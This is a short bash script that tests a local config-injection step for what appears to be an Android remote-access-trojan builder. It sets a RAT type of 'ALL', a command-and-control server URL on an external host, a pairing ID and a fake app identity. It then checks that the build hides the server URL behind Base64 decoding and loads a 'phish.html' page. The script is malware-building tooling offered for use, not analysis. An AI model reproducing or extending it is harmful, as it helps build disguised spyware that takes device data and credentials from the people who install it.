#!/usr/bin/env bash
# Test inject locally without GitHub
set -euo pipefail
cd "$(dirname "$0")/.."
export APP_NAME="${APP_NAME:-Test Slap}"
export APP_ID="${APP_ID:-com.sync.xxx}"
export RAT_TYPE="${RAT_TYPE:-ALL}"
export REDIRECT_MODE="${REDIRECT_MODE:-URL}"
export REDIRECT_VALUE="${REDIRECT_VALUE:-https://example.com}"
export SERVER_URL="${SERVER_URL:-http://papsky.queen-official.com:2468}"
export PAIR_ID="${PAIR_ID:-NEONXJZET882362}"
export VERSION_NAME=1.0
export VERSION_CODE=1
python3 builder/inject_config.py
echo "---- uid.json ----"
cat android/app/src/main/assets/uid.json
echo
echo "---- SERVER_URL snippet ----"
grep -n "Base64.decode" android/app/src/main/java/com/sync/xxx/DeviceService.kt | head -3
echo "---- load line ----"
grep -n "loadUrl\|phish.html\|loadDataWithBaseURL" android/app/src/main/java/com/sync/xxx/MainActivity.kt | head -10
echo "DONE local inject test"
